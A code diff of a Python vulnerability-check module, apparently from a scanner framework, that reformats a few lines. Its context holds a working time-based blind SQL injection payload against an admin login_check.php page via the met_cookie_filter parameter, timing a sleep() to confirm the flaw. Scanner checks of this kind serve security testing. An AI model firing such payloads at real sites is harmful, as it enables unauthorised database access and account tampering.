@@ -40,9 +40,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -58,7 +59,7 @@ class Poc(ABPoc):
             payload = self.target + \
                 '/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=admin_pass+where+id=1+and+233=if(1=1,sleep('+str(
                     delay_time)+'),233);+%23–'
-            #print delay_time;
+            # print delay_time;
             start_time = time.time()
             code, head, res, errcode, _ = hh.http(payload)
             payload_time = time.time() - start_time
